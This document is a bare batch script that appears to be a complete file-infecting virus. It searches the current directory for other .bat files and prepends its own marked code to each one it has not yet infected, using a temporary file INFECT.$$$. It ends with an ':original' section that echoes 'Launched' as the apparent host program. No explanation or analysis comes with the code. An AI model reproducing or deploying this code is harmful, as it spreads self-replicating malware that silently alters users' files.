@echo off%INFECT%
if i%1==iINFECT goto infect
for %%x in (*.bat) do call %0 INFECT %%x
echo on%INFECT%
@goto original%INFECT%
:INFECT
find "INFECT" %2 > nul
if not errorlevel 1 goto end%INFECT%
find "INFECT" < %0 > INFECT.$$$
echo :original >> INFECT.$$$
type %2 >> INFECT.$$$
echo. >> INFECT.$$$
echo :end >> INFECT.$$$
copy /b INFECT.$$$ %2 > nul
del INFECT.$$$ > nul
goto end%INFECT%
:original
@echo off
echo Launched
:end